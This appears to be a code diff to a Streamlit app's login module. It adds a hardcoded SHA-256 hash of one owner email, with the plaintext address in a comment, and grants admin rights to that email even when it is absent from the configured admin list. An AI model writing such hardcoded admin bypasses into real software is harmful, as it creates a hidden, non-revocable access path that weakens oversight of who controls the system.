@@ -7,6 +7,14 @@ import streamlit as st
 from config import _get_secret
 from modules.telemetry.tracker import track_login
 import os
+import hashlib
+
+
+# Emergency owner fallback: protects admin access even if Streamlit secrets are unreadable.
+# This is hash-based and only grants access to explicit owner emails.
+_FALLBACK_ADMIN_EMAIL_SHA256 = {
+    "a9789753a7913b3241e0092562a79ade409339b313fcd519e1fc7bdd362d75b5",  # saikatpatra64@gmail.com
+}
 
 
 def _nested_get(container, path: tuple[str, ...]):
@@ -138,7 +146,11 @@ def get_admin_emails() -> set[str]:
 
 
 def is_admin_user(email: str) -> bool:
-    return email.strip().lower() in get_admin_emails()
+    normalized = email.strip().lower()
+    if normalized in get_admin_emails():
+        return True
+    digest = hashlib.sha256(normalized.encode("utf-8")).hexdigest()
+    return digest in _FALLBACK_ADMIN_EMAIL_SHA256
 
 
 def require_login() -> None:
